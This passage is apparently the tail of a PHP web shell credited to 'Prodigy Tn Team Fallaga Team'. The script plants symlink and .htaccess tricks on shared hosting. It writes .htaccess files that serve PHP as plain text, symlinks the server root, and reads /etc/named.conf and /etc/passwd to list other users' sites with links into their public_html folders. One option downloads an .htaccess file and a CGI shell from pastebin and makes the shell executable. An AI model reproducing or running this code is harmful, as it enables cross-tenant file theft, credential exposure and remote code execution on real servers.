fclose($hsec4);

$sec5 = "sec5/.htaccess";
$hsec5 = fopen($sec5, 'w') or die("Error: Can't open file");
$con5 = "Options all
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html";
fwrite($hsec5, $con5);
fclose($hsec5);


$sec6 = "sec6/.htaccess";
$hsec6 = fopen($sec6, 'w') or die("Error: Can't open file");
$con6 = "Options +FollowSymLinks
DirectoryIndex Sux.html
Options +Indexes
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html";
fwrite($hsec6, $con6);
fclose($hsec6);

$sec7 = "sec7/.htaccess";
$hsec7 = fopen($sec7, 'w') or die("Error: Can't open file");
$con7 = "Options Indexes FollowSymLinks
AddType text/plain .php .inc .asp .php3
Options All
Options All";
fwrite($hsec7, $con7);
fclose($hsec7);


for ($k=1;$k<8;$k++){
if("$fp$k"){
chdir('sec'.$k);
system('ln -s / 1.txt');
chdir('../');
}
else{ echo "Error";
}
} 


if(isset($_REQUEST['OPT']))
{
switch ($_REQUEST['OPT'])
{
case '1';
echo "<center><table border='1' align='center' width='80%'><h3><td><a>Domains</td></a><td><a>User</a></td><td><a>Sym</a></td></h3></center>";
if(!is_file('DATA.txt')){
$named = @file("/etc/named.conf");
}else{
$named = @file("DATA.txt");
}
if(!$named)
{
 
                die ("</br></br><center><h2><a>ERROR !</a></h2></center>");
}
else
{
foreach($named as $dom){
preg_match_all('#zone "(.*)"#', $dom, $doms);
if(strlen(trim($doms[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$doms[1][0]));
echo "<tr><td><a href=http://www.".$doms[1][0]."/>".$doms[1][0]."</a></td><td><a>".$user['name']."</a></td><td><a href='sec1/1.txt/home/".$user['name']."/public_html/' >Sym1</a>~<a href='sec2/1.txt/home/".$user['name']."/public_html/' >Sym2</a>~<a href='sec3/1.txt/home/".$user['name']."/public_html/' >Sym3</a>~<a href='sec4/1.txt/home/".$user['name']."/public_html/' >Sym4</a>~<a href='sec5/1.txt/home/".$user['name']."/public_html/' >Sym5</a>~<a href='sec6/1.txt/home/".$user['name']."/public_html/' >Sym6</a>~<a href='sec7/1.txt/home/".$user['name']."/public_html/' >Sym7</a></td></tr>";
}
}
}
break;
case '2';
echo "<center><table border='1' align='center' width='80%'><h3><td><a>User</td></a><td><a>Sym</a></td></h3></center>";
$file = file('/etc/passwd');
if(!$file)
{
 
                die ("</br></br><center><h2><a>ERROR !</a></h2></center>");
}
else
{
foreach ($file as $f){
 
     $u=explode(':', $f);
     $user = $u['0'];
	 echo "<tr><td>".$user."</td><td><a href='sec1/1.txt/home/".$user."/public_html/' >Sym1</a>~<a href='sec2/1.txt/home/".$user."/public_html/' >Sym2</a>~<a href='sec3/1.txt/home/".$user."/public_html/' >Sym3</a>~<a href='sec4/1.txt/home/".$user."/public_html/' >Sym4</a>~<a href='sec5/1.txt/home/".$user."/public_html/' >Sym5</a>~<a href='sec6/1.txt/home/".$user."/public_html/' >Sym6</a>~<a href='sec7/1.txt/home/".$user."/public_html/' >Sym7</a></td></tr>";
}
}
break;
case '3';
$dir = 'prodigy';
@mkdir($dir);
if($dir){
    echo '<br> prodigy Has Been Created ~';
} else {
    echo '<br> [-] Error !';
}
   $htaccess = 'http://pastebin.com/raw.php?i=XBLhdvbQ';
    $file = file_get_contents($htaccess);
    $open = fopen('prodigy/.htaccess' , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo '<br> [htaccess] => Has Been Created ~';
     } else {
         echo "<br>[+] Error !";
     }
    $con = 'http://pastebin.com/raw.php?i=sk8JEgq0';
    $file = file_get_contents($con);
    $open = fopen('prodigy/con.cpc' , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo '<br> [cgi] => Has Been Created !';
     } else {
         echo '<br>[-] Error !';
     }


    $ch = 'prodigy/con.cpc';
        chmod($ch, 0755);
        if($cgip){
            echo '<br>[+] => CHMOD To 755 Complate ~';
        } else {
        }

echo ('<meta http-equiv="refresh" content="0; url=prodigy/con.cpc" />');
echo ('Please Whait . ');

break;
case '4';
mkdir("CONprodigy");
					chdir("CONprodigy");
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."
";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("prodigyTMP.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);
					 
					 $file = fopen("prodigyTMP.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);

$ht = 'Options Indexes FollowSymLinks
Options +Indexes
AddType txt .php
AddHandler txt .php';
    $open2 = fopen('.htaccess' , 'w');
    fwrite($open2,$ht);
    fclose($open2);
					echo "</table>";
					unlink("prodigyTMP.txt");
					echo ('<meta http-equiv="refresh" content="0; url=CONprodigy" />');
				
break;
}
} else { 
echo "</br>";
echo "</br>";
echo "<center> By Prodigy Tn Team Fallaga Team </center>"; }


?>
